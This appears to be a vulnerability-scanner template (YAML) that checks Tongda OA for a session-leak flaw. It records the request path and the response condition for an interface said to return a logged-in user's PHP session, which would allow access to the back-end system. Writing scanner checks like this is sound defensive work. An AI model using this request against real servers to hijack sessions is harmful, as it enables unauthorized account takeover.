name: tongda_OA_user_session_leakage
transport: http
set: {}
detail:
  dock: app="TongDa-OA"
  product: tongda-OA
  homepage: http://www.tongda2000.com/
  impact: ''
  description: There is an interface in Tongda OA to query online users, and when
    the user is online, PHPSESSION will be returned so that they can log in to the
    background system.
rules:
  r1:
    method: GET
    path: /mobile/auth_mobi.php?isAvatar=1&uid=0&P_VER=0
    expression: response.status == 200 && response.body.bcontains(b"RELOGIN")
expression: r1()
